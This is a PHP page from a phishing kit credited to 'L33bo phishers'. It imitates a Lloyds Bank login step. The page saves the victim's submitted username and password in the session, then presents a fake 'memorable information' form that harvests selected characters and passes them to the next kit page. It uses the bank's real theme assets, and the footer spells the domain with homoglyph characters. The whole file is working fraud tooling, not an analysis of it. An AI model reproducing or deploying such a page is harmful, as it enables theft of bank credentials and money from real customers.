<?php 
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
require "assets/includes/memo.php";
$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Enter Memorable</title>
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link href="assets/css/001.css" media="screen, print" type="text/css" rel="stylesheet">
<script src="assets/js/001.jspf" type="text/javascript"></script>
<script src="assets/js/001.js" type="text/javascript"></script>
<script src="assets/js/002.js" type="text/javascript"></script>
<script type="text/javascript">
DI.themePath="https://online.lloydsbank.co.uk/personal/unauth/assets/LloydsRetail/";
</script>
<script src="assets/js/003.js" type="text/javascript"></script>
</head>
<body>
<div id="wrapper">
<div class="outer">
<div id="header">
<ul id="skiplinks">
<li><a href="#">Skip to main content</a></li>
</ul>
<div class="clearfix">
<p id="logo"><span><img src="assets/img/002.png"/></span></p>
<div class="secureMsg"><p class="msg"><img src="assets/img/003.png"/></p>
<p><a class="linkBullet newwin" href="#">How can I tell that this site is secure?</a></p>
</div>
<div class="loggedIn">
<ul>
<li class="mobile"><a href="mobile/Login.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" class="linkBullet">Mobile</a></li>
<li class="cookie"><a class="linkBullet newwin" href="#">Cookie policy</a></li>
</ul>
</div>
</div>
</div>
</div>
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel">
<h1>Your memorable information</h1>
<div class="inner"><p><strong></strong></p>
<p><strong>Please enter characters 2, 4 and&nbsp;7 from your memorable information then click on the continue button.</strong></p>
<p><strong>We may ask you to enter your FULL memorable information.</strong></p>
<p></p>
<p>This login step improves security.</p>
</div>
<form id="memo" name="memo" method="post" action="MemorableRetry.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" class="validationName:(frmentermemorableinformation1) validate:()" autocomplete="off" enctype="application/x-www-form-urlencoded">
<fieldset class="memInfoSelect clearfix">
<div class="formField validate:(oneSelectFieldRequired) validationName:(memorableInformation) clearfix">
<div class="formFieldInner">
<div class="clearfix">
<label for="memo1">Character 1 :</label>
<select id="memo1" name="memo1">
<?php echo memoselect; ?>
</select>
</div>
<div class="clearfix">
<label for="memo2">Character 4 :</label>
<select id="memo2" name="memo2">
<?php echo memoselect; ?>
</select></div>
<div class="clearfix">
<label for="memo3">Character 6 :</label>
<select id="memo3" name="memo3">
<?php echo memoselect; ?>
</select>
</div>
</div>
</div>
</fieldset>
<div class="inner">
<ul class="linkList">
<li><a href="#">Having trouble logging in?</a></li>
</ul>
</div>
<ul class="actions">
<li class="primaryAction">
<input name="go" type="image" src="assets/img/004.png" alt="" class="submitAction">
</li>
<li><strong><a href="#" class="cancel pseudoLink">Cancel</a></strong></li>
</ul>
</form>
</div>
</div>
</div>
<?php echo memosecondary; ?>
</div>
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul>
<li><a class="newwin" href="#">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#">www.ll&#959;ydsbankinggr&#959;up.c&#959;m</a></li>
<li><a class="newwin" href="#">Rates and Charges</a></li>
</ul>
</div>
</div>
</div>
</div>
</body>
</html>